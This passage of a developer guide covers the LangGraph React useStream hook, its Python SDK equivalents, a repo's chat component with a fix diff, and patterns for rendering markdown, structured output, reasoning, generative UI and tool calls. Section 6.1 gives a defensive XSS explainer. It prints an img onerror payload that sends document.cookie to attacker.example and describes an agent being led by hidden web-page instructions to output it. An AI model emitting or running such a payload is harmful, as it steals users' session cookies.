| `toolCalls`                                 | Tool calls already paired with their results, each with a `status` of `"running"`, `"finished"` or `"error"`. |
| `isLoading`                                 | `true` while a run is in progress or the thread is first loading.                                   |
| `isThreadLoading`                           | `true` only while the thread's existing data is first loading.                                      |
| `error`                                     | The latest error, or `undefined`.                                                                   |
| `interrupt` / `interrupts`                  | The pending pause(s) on the root graph.                                                             |
| `threadId`                                  | The current thread.                                                                                 |
| `subagents`, `subgraphs`, `subgraphsByNode` | Maps of nested workers that were discovered (sections 9, 10).                                       |
| `submit(input, options?)`                   | Start a run.                                                                                        |
| `stop()` / `disconnect()`                   | End the run / stop listening (4.5).                                                                 |
| `respond(value)` / `respondAll(map)`        | Answer interrupts (4.6).                                                                            |
| `getThread()`                               | Low-level access, including interrupts from nested graphs.                                          |
| `client`                                    | The raw SDK client, for `threads.getHistory`, `threads.create`, etc.                                |


### 4.4 `submit`

`submit` sends the user's message to the agent:

```ts
import { HumanMessage } from "langchain";

// stream: the value returned by useStream<AgentState>(...) in your component (4.1)
void stream.submit({ messages: [new HumanMessage("hi")] });
```

To send a plain object, `{ type: "human", content: "hi" }`, instead (this repo does), allow it in your state type:

```ts
interface AgentState {
  messages: (BaseMessage | { type: "human"; content: string })[];
}

void stream.submit({ messages: [{ type: "human", content: "hi" }] });
```

`messages: (BaseMessage | { type: "human"; content: string })[]`
means that messages is an array ([]) where every item inside it can be EITHER:

1.An instance of BaseMessage (LangChain's class object, like new HumanMessage("hi")),

OR

2.A plain JavaScript object with { type: "human"; content: string }.

Both send the same thing to the server.

Useful options: `forkFrom` (start from an earlier checkpoint, 8.1), `multitaskStrategy` (what happens if a run is already active, 8.2), `config`, `metadata`, and `onError`.

**Don't use `submit` to answer an interrupt.** Use `respond` (4.6).

### 4.5 `stop` vs `disconnect`


| User intent                     | Call                                                                                                     |
| ------------------------------- | -------------------------------------------------------------------------------------------------------- |
| "Stop the agent"                | `stream.stop()`. This **cancels** the run on the server and keeps the messages already received.         |
| "I'm leaving, but keep working" | `stream.disconnect()`. The run continues on the server.                                                  |
| "I'm back"                      | Mount the component again with the **same `threadId`**. It re-attaches automatically (full code in 8.3). |


### 4.6 `respond` and `respondAll`

Each case shows where the values come from:

```tsx
import { useStream } from "@langchain/react";
import type { AgentState, ApprovalInterrupt } from "./types";   // Appendix A
import { AGENT_URL } from "./shared";                            // Appendix A

export function InterruptButtons() {
  const stream = useStream<AgentState, ApprovalInterrupt>({ apiUrl: AGENT_URL, assistantId: "agent" });

  // 1. Exactly one interrupt is pending
  const approve = () => stream.respond({ approved: true });

  // 2. Several root interrupts: pick one by its id
  const approveFirst = () => {
    const intr = stream.interrupts[0];                // { id, value }
    if (!intr?.id) return;                            // id is optional in the type
    return stream.respond({ approved: true }, { interruptId: intr.id });
  };

  // 3. Interrupt from a subagent or subgraph: needs its id AND namespace
  const approveNested = () => {
    const e = stream.getThread()?.interrupts[0];       // { interruptId, payload, namespace }
    if (!e) return;
    return stream.respond({ approved: true }, { interruptId: e.interruptId, namespace: e.namespace });
  };

  // 4. Two interrupts pending at the same checkpoint: answer both in one call
  const answerBoth = () => {
    const [a, b] = stream.interrupts;
    if (!a?.id || !b?.id) return;
    return stream.respondAll({ [a.id]: { approved: true }, [b.id]: { approved: false } });
  };

  return (
    <div>
      <button onClick={() => void approve()}>Approve</button>
      <button onClick={() => void approveFirst()}>Approve first</button>
      <button onClick={() => void approveNested()}>Approve nested</button>
      <button onClick={() => void answerBoth()}>Answer both</button>
    </div>
  );
}
```

**What each piece does:**

- `InterruptButtons`: a row of buttons that answer the agent when it pauses to ask something. Each button shows one of the 4 cases.
- `ApprovalInterrupt`: the shape of the question the agent sends when it pauses (here: `{ question }`).

- `stream.interrupt` only shows **root** interrupts. Interrupts from subagents or subgraphs are in `stream.getThread()?.interrupts`, and you must pass their `namespace` (case 3).
- Several interrupts waiting at the same checkpoint must be answered **together** with `respondAll` (case 4). After the first `respond()`, a new run starts and the second call fails.

### 4.7 Typing the state for a Python backend

TypeScript can't read Python types, so write an interface that matches the Python graph state. Keep it in one `types.ts`. The full file is in [Appendix A](#14-appendix-a-shared-components):

```ts
import type { BaseMessage, Todo } from "langchain";

export interface AgentState {
  messages: BaseMessage[];
  todos?: Todo[];                    // only if the backend enables TodoListMiddleware
}

export interface ApprovalInterrupt { question: string }   // shape of your interrupt() payload
```

```tsx
// AGENT_URL: Appendix A
const stream = useStream<AgentState, ApprovalInterrupt>({ apiUrl: AGENT_URL, assistantId: "agent" });
```

With a TypeScript backend in the same repo, use `useStream<typeof agent>` and every type is inferred.

TypeScript interface ↔ Python `TypedDict`:

```python
from typing import NotRequired, TypedDict
from langchain_core.messages import BaseMessage
from langchain.agents.middleware.todo import Todo

class AgentState(TypedDict):
    messages: list[BaseMessage]
    todos: NotRequired[list[Todo]]    # ? in TypeScript = NotRequired in Python
```

**This repo needs this fix.** [preview.tsx](packages/frontend/src/patterns/markdown-messages/preview.tsx) uses `useStream<typeof simpleAgent>`, and [agents-types.d.ts](packages/frontend/src/agents-types.d.ts) declares `simpleAgent` as `any`, so `stream.values` isn't type-checked at all. The fix has two parts.

1. Add a new file, `packages/frontend/src/types.ts`:

```ts
import type { BaseMessage } from "langchain";

// Must match the Python graph state. simple_agent only uses messages.
export interface AgentState {
  messages: BaseMessage[];
}
```

1. Change `preview.tsx`. This diff also includes the two section 5 fixes (the unused `bottomRef`, and the missing Stop button and error display):

```diff
-import { useRef, useState } from "react";
+import { useState } from "react";
 import { useStream } from "@langchain/react";
 import { HumanMessage, AIMessage } from "langchain";
-import type { simpleAgent } from "@langchain/playground-agents";
+import type { AgentState } from "@/types";
 ...
-  const stream = useStream<typeof simpleAgent>({
+  const stream = useStream<AgentState>({
 ...
-  const bottomRef = useRef<HTMLDivElement>(null);
   const handleSubmit = (text: string) => {
-    stream.submit({ messages: [{ type: "human" as const, content: text }] });
+    stream.submit({ messages: [new HumanMessage(text)] });
   };
 ...
       {stream.isLoading && <TypingIndicator />}
-      <div ref={bottomRef} />
+      {stream.isLoading && <button onClick={() => void stream.stop()}>Stop</button>}
+      {stream.error != null && <div role="alert">{String(stream.error)}</div>}
```

I applied this diff to a copy of the repo's `src/` and it typechecks. The `handleSubmit` change is required: with `AgentState`, the old plain-object message no longer compiles (4.4).

### 4.8 The same calls in Python (`langgraph_sdk`)

`useStream` is a React wrapper around HTTP calls to the Agent Server. The Python SDK makes the same calls, which is a good way to see what the hook is doing. These signatures were checked against the installed `langgraph_sdk`:

Run it with the Agent Server up (`make dev`):

```python
import asyncio
from langgraph_sdk import get_client

async def main():
    client = get_client(url="http://localhost:2024")        # useStream({ apiUrl })

    thread = await client.threads.create()                   # happens on first submit when threadId is null
    thread_id = thread["thread_id"]                          # what onThreadId receives

    async for chunk in client.runs.stream(                   # stream.submit(...)
        thread_id,
        "simple_agent",                                      # assistantId
        input={"messages": [{"type": "human", "content": "hi"}]},
        stream_mode="values",
    ):
        if chunk.event == "values":
            messages = chunk.data["messages"]                # becomes stream.messages; useStream re-renders here
            print(messages[-1]["content"])

asyncio.run(main())
```


| `useStream` (TypeScript)                          | Python SDK                                                               |
| ------------------------------------------------- | ------------------------------------------------------------------------ |
| `stream.submit({ messages: [...] })`              | `client.runs.stream(thread_id, assistant_id, input={...})`               |
| `stream.isLoading`                                | `True` while the `async for` loop is still receiving chunks              |
| `stream.stop()`                                   | `await client.runs.cancel(thread_id, run_id)`                            |
| `stream.respond(value)`                           | `client.runs.stream(thread_id, assistant_id, command={"resume": value})` |
| `submit(input, { forkFrom: cp })`                 | `client.runs.stream(..., checkpoint_id=cp)`                              |
| `submit(input, { multitaskStrategy: "enqueue" })` | `client.runs.stream(..., multitask_strategy="enqueue")`                  |
| `stream.client.threads.getHistory(id)`            | `await client.threads.get_history(thread_id)`                            |


What the hook adds on top of these calls: it keeps the results in React state and re-renders on each chunk, pairs tool calls with their results, shows your message before the server confirms it, and re-attaches to a running thread when the component mounts again.

---

## 5. This repo's chat, line by line

File: [preview.tsx](packages/frontend/src/patterns/markdown-messages/preview.tsx). This is the **markdown messages** pattern.

Everything it uses, and where it's defined:


| Name | What it does | Defined in |
| --- | --- | --- |
| `useState`, `useRef` | React hooks: remember a value (2.7, 2.9) | `"react"` |
| `useStream` | Connects to the agent, gives you `stream` | `"@langchain/react"` |
| `HumanMessage`, `AIMessage` | Message classes, used to check who sent a message | `"langchain"` |
| `simpleAgent` | Type stub (`any`); should be replaced (4.7) | [agents-types.d.ts](packages/frontend/src/agents-types.d.ts) |
| `AGENT_SERVER_URL`, `SLUG_TO_ASSISTANT` | The agent's URL, and which graph to use | [agent-config.ts](packages/frontend/src/agent-config.ts) |
| `ChatContainer` | The page layout: a scrolling message area on top, the input bar at the bottom | [ChatContainer.tsx](packages/frontend/src/components/chat/ChatContainer.tsx) |
| `ChatInput` | The message box where you type your question, a Send button, and a "+ New thread" button | [ChatInput.tsx](packages/frontend/src/components/chat/ChatInput.tsx) |
| `PresetPrompts` | The 3 example questions shown as buttons when the chat is empty | [PresetPrompts.tsx](packages/frontend/src/components/chat/PresetPrompts.tsx) |
| `HumanBubble` | Your message: a dark bubble on the right with a user icon | [Bubble.tsx](packages/frontend/src/components/chat/Bubble.tsx) |
| `AIBubble` | The AI's reply: a light bubble on the left with a bot icon | [Bubble.tsx](packages/frontend/src/components/chat/Bubble.tsx) |
| `Markdown` | Shows markdown text as formatted HTML (headings, lists, tables, code) | [Markdown.tsx](packages/frontend/src/components/Markdown.tsx) |
| `TypingIndicator` | Three bouncing dots while the agent is replying | [TypingIndicator.tsx](packages/frontend/src/components/chat/TypingIndicator.tsx) |
| `PRESETS`, `handleSubmit`, `bottomRef` | The example questions, the send function, an unused ref | preview.tsx itself |


The components are imported through [playground.ts](packages/frontend/src/components/playground.ts), a file that only re-exports them.

**What `@/` means in the imports.** `@/` is a shortcut for the `src/` folder. It's set up in [vite.config.ts](packages/frontend/vite.config.ts) (`"@": path.resolve(__dirname, "src")`) and in `tsconfig.json` (`"paths": { "@/*": ["src/*"] }`). So these two lines are the same:

```ts
import { ChatInput } from "@/components/playground";
import { ChatInput } from "./src/components/playground";   // written from packages/frontend/
```

Python equivalent: `from src.components.playground import ChatInput`.

| Import | What it is |
| --- | --- |
| `@/components/playground` | `@` followed by `/`: this repo's `src/` folder. Not a package. |
| `@langchain/react` | `@langchain` is an npm organization: a real package listed in `package.json`. |
| `@langchain/playground-agents` | Not installed. It's only declared in [agents-types.d.ts](packages/frontend/src/agents-types.d.ts). It's imported with `import type`, which is removed when the code is compiled, so it's never loaded. |

```tsx
const PRESETS = [
  "Write a quick-start guide for building a REST API with Express.js",
  "Compare Python and Rust in a table with pros and cons",
  "Explain the merge sort algorithm with code examples",
];
```

These are the example prompts shown as buttons while the chat is empty.

```tsx
const [threadId, setThreadId] = useState<string | null>(null);
```

This is the current conversation. `null` means none has started yet.

```tsx
const stream = useStream<typeof simpleAgent>({
  apiUrl: AGENT_SERVER_URL,                              // from agent-config.ts
  assistantId: SLUG_TO_ASSISTANT["markdown-messages"],   // "simple_agent"
  threadId,
  onThreadId: setThreadId,                               // save the id the server creates
});
```

This connects to the agent.

```tsx
const handleSubmit = (text: string) => {
  stream.submit({ messages: [{ type: "human" as const, content: text }] });
};
```

This sends the user's text as a human message.

```tsx
<ChatContainer
  input={
    <ChatInput
      onSubmit={handleSubmit}
      disabled={stream.isLoading}
      onNewThread={stream.messages.length > 0 ? () => setThreadId(null) : undefined}
    />
  }
>
```

The layout has a scrolling message area and an input bar. The "new thread" button only appears once there are messages. Clicking it sets `threadId` to `null`, which starts a new conversation.

```tsx
{stream.messages.length === 0 && <PresetPrompts prompts={PRESETS} onSelect={handleSubmit} />}
```

The example prompts only appear while the chat is empty.

```tsx
{stream.messages.map((msg) => {
  if (HumanMessage.isInstance(msg)) {
    return <HumanBubble key={msg.id}><Markdown>{msg.text}</Markdown></HumanBubble>;
  }
  if (AIMessage.isInstance(msg)) {
    return <AIBubble key={msg.id}><Markdown>{msg.text}</Markdown></AIBubble>;
  }
  return null;
})}
{stream.isLoading && <TypingIndicator />}
<div ref={bottomRef} />
```

Each message is rendered as a bubble that matches its type. The dots show while the agent is replying.

Two things to fix. Both are included in the diff in [4.7](#47-typing-the-state-for-a-python-backend):

- `**bottomRef` does nothing.** It's attached to the last `<div>`, but nothing reads it. Auto-scroll actually comes from the `useEffect` in `ChatContainer`. Fix: delete `const bottomRef = useRef<HTMLDivElement>(null);`, delete `<div ref={bottomRef} />`, and remove `useRef` from the import.
- **No Stop button and no error display.** Fix: add these two lines after `<TypingIndicator />`:

```tsx
{stream.isLoading && <button onClick={() => void stream.stop()}>Stop</button>}
{stream.error != null && <div role="alert">{String(stream.error)}</div>}
```

**How it maps to the minimal example (4.1):** `ChatInput` is `Composer`, `HumanBubble` is `UserBubble`, and `AIBubble` + `Markdown` is `AssistantBubble`.

---

## 6. Patterns: showing output

Source: [02-render-output.md](langgraph-react-frontend/references/02-render-output.md)

### 6.1 Markdown messages (what this repo does)

LLMs write markdown. Render it as formatted HTML instead of raw text.

1. `useStream` adds each streamed token to `msg.text` and re-renders.
2. A markdown parser (`react-markdown` + `remark-gfm` for tables) turns the text into React elements.
3. React updates the screen.

**Rule 1: never insert model output as raw HTML.**

```tsx
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import DOMPurify from "dompurify";
import { marked } from "marked";

// DON'T: model output becomes live HTML (a <script> or onerror= in the reply would run)
function Unsafe({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// DO (this repo's approach): react-markdown builds React elements, never raw HTML
function Safe({ text }: { text: string }) {
  return <ReactMarkdown remarkPlugins={[remarkGfm]}>{text}</ReactMarkdown>;
}

// If you really need an HTML string: sanitize it first
function SanitizedHtml({ text }: { text: string }) {
  const html = marked.parse(text, { async: false });                              // markdown → HTML string
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;  // strips scripts, handlers
}
```

**What each import does:**

- `react-markdown`: turns a markdown string into React elements (headings, lists, links). It never inserts raw HTML, which is what makes it safe.
- `remark-gfm`: a plugin for `react-markdown` that adds GitHub-style markdown: tables, ~~strikethrough~~, task lists and auto-links. Without it, tables show as plain text.
- `marked`: turns a markdown string into an HTML string. Unlike `react-markdown`, its output isn't safe on its own.
- `dompurify`: cleans an HTML string by removing anything that could run code, such as `<script>` tags and `onerror=` attributes.

**What each piece does:**

- `Unsafe`: the wrong way: puts the AI's text straight into the page as HTML.
- `Safe`: the right way: turns the AI's markdown into normal page elements.
- `SanitizedHtml`: for when you need raw HTML: converts markdown to HTML, then removes anything dangerous.

**What `dangerouslySetInnerHTML` does.** It makes the browser treat a string as **real HTML** instead of plain text. So `<b>hi</b>` shows as bold, but a malicious tag also **runs**. This is an injection attack (XSS).

For example, say the agent read a web page that contained hidden instructions, and its reply includes this text:

```html
<img src="x" onerror="fetch('https://attacker.example/?c=' + document.cookie)">
```

- **With `Unsafe`:** the browser tries to load the image, fails, and runs the `onerror` code. That sends the user's cookies to the attacker.
- **With `Safe`:** `react-markdown` shows it as harmless text.
- **With `SanitizedHtml`:** `DOMPurify` removes the `onerror` attribute before it reaches the page.

**What `remarkPlugins={[remarkGfm]}` means.** It's how you add plugins to `react-markdown`. The prop takes a list (`[ ]`) of plugins, and here there's only one: `remarkGfm`, which adds tables and strikethrough. To add another, put it in the list: `remarkPlugins={[remarkGfm, remarkMath]}`.

**Rule 2: only re-render the message that's streaming.** Pass `streaming` only to the last message, and use the memoized `MarkdownBubble` from [Appendix A](#14-appendix-a-shared-components). The other messages keep the same props, so they skip re-rendering (2.10):

```tsx
import { useStream } from "@langchain/react";
import { AIMessage, HumanMessage } from "langchain";
import type { AgentState } from "./types";                              // Appendix A
import { AGENT_URL, MarkdownBubble, UserBubble } from "./shared";      // Appendix A

export function MessageListStreaming() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "simple_agent" });
  return (
    <div>
      {stream.messages.map((msg, i) => {
        if (HumanMessage.isInstance(msg)) return <UserBubble key={msg.id} text={msg.text} />;
        if (AIMessage.isInstance(msg)) {
          const streaming = stream.isLoading && i === stream.messages.length - 1;   // only the last one
          return <MarkdownBubble key={msg.id} text={msg.text} streaming={streaming} />;
        }
        return null;
      })}
    </div>
  );
}
```

**What each piece does:**

- `MessageListStreaming`: the chat's message list. It marks only the last AI message as "still streaming".
- `MarkdownBubble`: one AI reply box that renders markdown and shows a blinking cursor while streaming (Appendix A).

**Rule 3: handle half-finished markdown, and highlight code only once it's finished.** Mid-stream, a code block may have no closing fence and no language yet. Syntax highlighting is also the slowest part. This `code` renderer does both:

```tsx
import { useEffect, useState, type ComponentPropsWithoutRef } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { codeToHtml } from "shiki";                 // highlighter; already in this repo's package.json

function HighlightedCode({ code, lang }: { code: string; lang: string }) {
  const [html, setHtml] = useState<string | null>(null);
  useEffect(() => {
    codeToHtml(code, { lang, theme: "github-light" })
      .then(setHtml)
      .catch(() => setHtml(null));                     // unknown language: keep plain text
  }, [code, lang]);
  if (html == null) return <pre><code>{code}</code></pre>;
  return <div dangerouslySetInnerHTML={{ __html: html }} />;   // shiki escapes the code itself
}

export function StreamingMarkdown({ text, streaming }: { text: string; streaming: boolean }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={{
        code: ({ className, children }: ComponentPropsWithoutRef<"code">) => {
          const lang = /language-(\w+)/.exec(className ?? "")?.[1];   // undefined for inline or unfinished blocks
          const code = String(children ?? "");
          if (!lang || streaming) return <code className={className}>{code}</code>;   // plain text while streaming
          return <HighlightedCode code={code} lang={lang} />;                         // highlight once finished
        },
      }}
    >
      {text}
    </ReactMarkdown>
  );
}
```

**What each import does:**

- `shiki`: a syntax highlighter. `codeToHtml` turns code into colored HTML.

**What each piece does:**

- `HighlightedCode`: a code block with syntax colors.
- `StreamingMarkdown`: renders the AI's markdown. Code stays plain while the answer is streaming and gets colors once it's finished.

### 6.2 Structured output

The agent returns **typed data**, usually as tool-call arguments, instead of prose. You render each field as its own UI element.

This example validates the data with Zod, a library that checks an object's shape at runtime. That handles both "the args are still streaming in" and "the args have the wrong shape":

```tsx
import { useStream } from "@langchain/react";
import { AIMessage } from "langchain";
import { z } from "zod";
import type { AgentState } from "./types";            // Appendix A
import { AGENT_URL, Spinner } from "./shared";        // Appendix A

// Must match the backend's structured-output schema
const MathSolutionSchema = z.object({
  problem: z.string(),
  steps: z.array(z.object({ explanation: z.string(), latex: z.string() })),
  answer: z.string(),
});
type MathSolution = z.infer<typeof MathSolutionSchema>;   // the TypeScript type, derived from the schema

function SolutionCard({ solution }: { solution: MathSolution }) {
  return (
    <div className="rounded-lg border p-4">
      <h3>{solution.problem}</h3>
      <ol>
        {solution.steps.map((step, i) => (
          <li key={i}>{step.explanation} <code>{step.latex}</code></li>
        ))}
      </ol>
      <p><strong>Answer:</strong> {solution.answer}</p>
    </div>
  );
}

function LoadingIndicator() {
  return <p><Spinner /> Solving…</p>;
}

export function MathChat() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "structured_output_latex" });
  const last = [...stream.messages].reverse().find(AIMessage.isInstance);   // LATEST AI message
  const parsed = MathSolutionSchema.safeParse(last?.tool_calls?.[0]?.args);
  const solution = parsed.success ? parsed.data : null;                      // null while args are still partial
  if (solution) return <SolutionCard solution={solution} />;
  return stream.isLoading ? <LoadingIndicator /> : null;
}
```

**What each import does:**

- `zod`: describes the shape data should have, then checks real data against it while the app runs. `safeParse` returns the data if it matches, or a failure if it doesn't.

**What each piece does:**

- `MathSolutionSchema`: the rule for what a complete answer looks like: a problem, a list of steps, and an answer.
- `SolutionCard`: a card that shows the problem, the numbered steps, and the final answer.
- `LoadingIndicator`: a spinner with "Solving…" while the answer isn't ready.
- `MathChat`: the screen: shows the loading indicator, then the card once the answer is complete.
- `Spinner`: a small spinning icon (Appendix A).

Python equivalent of finding the latest AI message's args:

```python
from langchain_core.messages import AIMessage, HumanMessage

messages = [                                        # sample conversation
    HumanMessage("Solve 2x = 4"),
    AIMessage("", tool_calls=[{"id": "c1", "name": "MathSolution", "args": {"answer": "x = 2"}}]),
]

last = next((m for m in reversed(messages) if isinstance(m, AIMessage)), None)
args = last.tool_calls[0]["args"] if last and last.tool_calls else None
print(args)                                         # {'answer': 'x = 2'}
```

- Search from the **end** of the message list (`reverse()`), so you get the latest answer and not the first one.
- If the agent can also call real tools, pick the structured-output call by name instead of taking `tool_calls[0]`: `last?.tool_calls?.find((tc) => tc.name === "MathSolution")`.

### 6.3 Reasoning tokens

Models with "extended thinking" return separate content blocks: `"reasoning"` (the thinking) and `"text"` (the answer). Use `msg.contentBlocks` instead of `msg.text` so the thinking doesn't mix into the answer. The reasoning goes in a collapsible `<details>` that's open while only reasoning has arrived:

```tsx
import { useState } from "react";
import { AIMessage } from "langchain";
import { MarkdownBubble } from "./shared";            // Appendix A

function extractBlocks(msg: AIMessage) {
  const reasoning = msg.contentBlocks.filter((b) => b.type === "reasoning").map((b) => b.reasoning).join("");
  const text = msg.contentBlocks.filter((b) => b.type === "text").map((b) => b.text).join("");
  return { reasoning, text };
}

export function AssistantMessage({ msg, isStreaming }: { msg: AIMessage; isStreaming: boolean }) {
  const { reasoning, text } = extractBlocks(msg);
  const thinking = isStreaming && reasoning.length > 0 && text.length === 0;   // reasoning so far, no answer yet
  const [open, setOpen] = useState(false);
  return (
    <div>
      {reasoning && (
        <details open={open || thinking} onToggle={(e) => setOpen(e.currentTarget.open)}>
          <summary>{thinking ? "Thinking..." : "Show reasoning"}</summary>
          <div className="whitespace-pre-wrap text-sm">{reasoning}</div>
        </details>
      )}
      {text && <MarkdownBubble text={text} streaming={isStreaming} />}
    </div>
  );
}
```

**What each piece does:**

- `extractBlocks`: splits one AI message into its thinking text and its answer text.
- `AssistantMessage`: one AI reply: a collapsible "Show reasoning" section, then the answer.

Use it in the list like `MarkdownBubble` in 6.1: `<AssistantMessage key={msg.id} msg={msg} isStreaming={streaming} />`. If no reasoning blocks ever arrive, the backend hasn't enabled reasoning on the model.

### 6.4 Generative UI

The agent's output decides **which UI appears**, not only which text. There are three levels, depending on who writes the UI:

- **Controlled**: you write every component, and the agent only picks one and supplies its data. Tool-call cards (7.1), todo lists (9.2) and structured output (6.2) all belong here. This is the most predictable option.
- **Declarative**: the agent sends a JSON description of a component tree, and the frontend builds it from a **catalog** (the list of components the agent may use) and a **registry** (how each one renders).
- **Open-ended**: a third party (for example an MCP server) provides the UI, and you show it in a **sandboxed iframe**.

**Declarative example** with `@json-render` (already in this repo's package.json):

```tsx
import { useStream } from "@langchain/react";
import { AIMessage } from "langchain";
import { defineCatalog, type Spec } from "@json-render/core";
import { schema } from "@json-render/react/schema";
import { defineRegistry, Renderer } from "@json-render/react";
import { z } from "zod";
import type { AgentState } from "./types";   // Appendix A
import { AGENT_URL } from "./shared";         // Appendix A

// catalog = what the agent may use (the backend prompt must describe the same list)
export const catalog = defineCatalog(schema, {
  components: {
    Card: { props: z.object({ title: z.string() }), description: "A card container" },
    Metric: { props: z.object({ label: z.string(), value: z.string() }), description: "One metric value" },
  },
  actions: {},
});

// registry = how each catalog entry renders
export const { registry } = defineRegistry(catalog, {
  components: {
    Card: ({ props, children }) => <div className="rounded-lg border p-4"><h3>{props.title}</h3>{children}</div>,
    Metric: ({ props }) => <div><span>{props.label}</span> <strong>{props.value}</strong></div>,
  },
});

export function GenerativeUI() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "generative_ui" });
  const aiMessage = [...stream.messages].reverse().find(AIMessage.isInstance);
  const spec = aiMessage?.tool_calls?.[0]?.args;
  if (stream.isLoading || !spec) return null;   // the spec is partial while streaming: wait for the run to finish
  return <Renderer spec={spec as Spec} registry={registry} />;
}
```

**What each import does:**

- `@json-render/core`: defines the catalog: which components the agent may use, and their props.
- `@json-render/react`: `defineRegistry` says how each catalog component looks, and `Renderer` draws a JSON spec using it.

**What each piece does:**

- `catalog`: the list of UI pieces the agent is allowed to use (here: `Card` and `Metric`).
- `registry`: how each of those pieces looks on screen.
- `GenerativeUI`: the screen that draws whatever UI the agent described, once its reply is complete.

Keep the catalog small; a smaller catalog produces better specs. Waiting for `isLoading` to be `false` is the simplest way to avoid rendering a half-finished spec.

**Open-ended example.** The third-party UI is untrusted, so it runs in a sandboxed iframe and can only talk to you through `postMessage`, which you check by origin:

```tsx
import { useEffect } from "react";

export function AgentAppFrame({ src, onMessage }: { src: string; onMessage: (data: unknown) => void }) {
  useEffect(() => {
    const allowedOrigin = new URL(src).origin;
    const handler = (event: MessageEvent) => {
      if (event.origin !== allowedOrigin) return;   // ignore messages from any other origin
      onMessage(event.data);
    };
    window.addEventListener("message", handler);
    return () => window.removeEventListener("message", handler);   // clean up when unmounted
  }, [src, onMessage]);

  // sandbox="allow-scripts": scripts run, but no access to your page, cookies or storage
  return <iframe src={src} sandbox="allow-scripts" title="Agent app" className="h-96 w-full border" />;
}
```

**What each piece does:**

- `AgentAppFrame`: a box that shows a third-party app page inside yours, safely, and passes on only the messages it's allowed to send.

---

## 7. Patterns: showing agent actions

Source: [03-agent-actions.md](langgraph-react-frontend/references/03-agent-actions.md)

### 7.1 Tool calling

`stream.toolCalls` pairs each tool request with its result for you. Each item is an `AssembledToolCall` (type from `"@langchain/react"`):

```ts
interface AssembledToolCall {
  name: string;          // e.g. "get_weather"
  callId: string;        // same id as in the AI message's tool_calls
  input: unknown;        // the arguments
  output: unknown | null;
  status: "running" | "finished" | "error";
  error?: string;
}
```

Show one card per call and handle all three states. Every card component is defined here:

```tsx
import { useStream, type AssembledToolCall } from "@langchain/react";
import { AIMessage, HumanMessage } from "langchain";
import type { AgentState } from "./types";                                  // Appendix A
import { AGENT_URL, MarkdownBubble, Spinner, UserBubble } from "./shared";  // Appendix A

function LoadingCard({ name, args }: { name: string; args: unknown }) {
  return (
    <div className="flex items-center gap-2 rounded-lg border p-3">
      <Spinner /> <span>Running {name}</span>
      <code className="truncate text-xs">{JSON.stringify(args)}</code>   {/* show what it's doing */}
    </div>
  );
}

function ErrorCard({ name, error }: { name: string; error?: string }) {
  return (
    <div className="rounded-lg border border-red-300 bg-red-50 p-3">
      <strong>Error in {name}</strong>
      <p className="text-sm">{error ?? "Tool execution failed"}</p>
    </div>
  );
}

type WeatherInput = { location: string };                          // your backend tool's args
type WeatherOutput = { temperature: number; conditions: string };  // your backend tool's result

function WeatherCard({ input, output }: { input: WeatherInput; output: WeatherOutput | null }) {
  return (
    <div className="rounded-lg border p-3">
      <strong>{input.location}</strong>
      {output && <p>{output.temperature}° · {output.conditions}</p>}
    </div>
  );
}

function GenericToolCard({ toolCall }: { toolCall: AssembledToolCall }) {   // fallback for unknown tools
  return (
    <details className="rounded-lg border p-3">
      <summary>{toolCall.name}</summary>
      <pre className="text-xs">{JSON.stringify({ input: toolCall.input, output: toolCall.output }, null, 2)}</pre>
    </details>
  );
}

export function ToolCard({ toolCall }: { toolCall: AssembledToolCall }) {
  if (toolCall.status === "running") return <LoadingCard name={toolCall.name} args={toolCall.input} />;
  if (toolCall.status === "error") return <ErrorCard name={toolCall.name} error={toolCall.error} />;
  switch (toolCall.name) {
    case "get_weather":
      return <WeatherCard input={toolCall.input as WeatherInput} output={toolCall.output as WeatherOutput | null} />;
    default:
      return <GenericToolCard toolCall={toolCall} />;
  }
}

// Put each AI message's cards under it: keep only the calls whose id is in message.tool_calls
function AssistantTurn({ message, toolCalls }: { message: AIMessage; toolCalls: AssembledToolCall[] }) {
  const mine = toolCalls.filter((tc) => message.tool_calls?.some((t) => t.id === tc.callId));
  return (
    <div>
      {message.text && <MarkdownBubble text={message.text} />}
      {mine.map((tc) => <ToolCard key={tc.callId} toolCall={tc} />)}   {/* key by callId, not index */}
    </div>
  );
}

export function ToolChat() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "tool_calling" });
  return (
    <div>
      {stream.messages.map((msg) =>
        AIMessage.isInstance(msg) ? (
          <AssistantTurn key={msg.id} message={msg} toolCalls={stream.toolCalls} />
        ) : HumanMessage.isInstance(msg) ? (
          <UserBubble key={msg.id} text={msg.text} />
        ) : null,
      )}
    </div>
  );
}
```

**What each piece does:**

- `LoadingCard`: shown while a tool is running: a spinner, the tool name, and its arguments.
- `ErrorCard`: a red card shown when a tool failed.
- `WeatherCard`: the card for the `get_weather` tool: the location and, once finished, the temperature.
- `GenericToolCard`: the fallback card for any other tool: a collapsible box with its raw input and output.
- `ToolCard`: picks which of the cards above to show, based on the tool's status and name.
- `AssistantTurn`: one AI reply: its text, then a card for each tool it called.
- `ToolChat`: the chat screen: user messages and AI replies with their tool cards.

**How the `mine` line works:**

```ts
const mine = toolCalls.filter((tc) => message.tool_calls?.some((t) => t.id === tc.callId));
```

In plain words: keep each tool call `tc` if **some** id in this message's `tool_calls` equals `tc.callId`.

- **`.filter(fn)`** goes through a list and keeps only the items where `fn` returns `true`. It returns a new list.
- **`.some(fn)`** returns `true` if **at least one** item in the list makes `fn` true.
- **`?.`** handles messages with no tool calls. If `message.tool_calls` is `undefined`, the check gives `undefined`, which counts as false, so nothing is kept.

```ts
[1, 2, 3].filter((n) => n > 1);   // [2, 3]
[1, 2, 3].some((n) => n > 2);     // true
[1, 2, 3].some((n) => n > 5);     // false

const toolCalls = [{ callId: "c1", name: "get_weather" }, { callId: "c9", name: "web_search" }];  // every call in the chat
const message = { tool_calls: [{ id: "c1" }] };                                                    // this message only asked for c1
toolCalls.filter((tc) => message.tool_calls?.some((t) => t.id === tc.callId));   // → [get_weather]
```

Python equivalent of the `mine` filter:

```python
from types import SimpleNamespace as obj
